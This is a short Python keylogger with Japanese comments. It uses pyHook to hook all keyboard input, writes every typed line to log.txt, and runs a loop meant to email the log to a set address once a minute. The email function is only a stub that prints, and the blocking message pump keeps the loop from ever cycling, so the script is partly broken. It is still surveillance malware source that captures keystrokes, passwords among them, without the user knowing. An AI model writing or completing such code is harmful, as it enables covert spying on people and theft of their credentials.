import time
import pythoncom
import pyHook

def send_email(to_address):
    # ここでメール送信の処理を行う
    print(f"Sending email to: {to_address}")

def get_keyboard_input_history(filename):
    input_history = ''

    def keyboard_callback(event):
        nonlocal input_history
        if event.Ascii == 13:  # Enterキーが押されたら入力履歴を保存
            save_input_history_to_file(input_history, filename)
            input_history = ''  # 入力履歴をリセット
        else:
            input_history += chr(event.Ascii)  # 入力履歴に追加
        return True

    # キーボードの入力を監視
    hook_manager = pyHook.HookManager()
    hook_manager.KeyDown = keyboard_callback
    hook_manager.HookKeyboard()
    pythoncom.PumpMessages()

def save_input_history_to_file(input_history, filename):
    with open(filename, 'a') as file:
        file.write(input_history)

to_address = 'example_no_reply@example.com'  # 宛先のメールアドレスを指定
input_history_file = 'log.txt'

while True:
    # キーボードの入力履歴を取得
    get_keyboard_input_history(input_history_file)

    # メールを送信
    send_email(to_address)

    # 1分間の待機
    time.sleep(60)
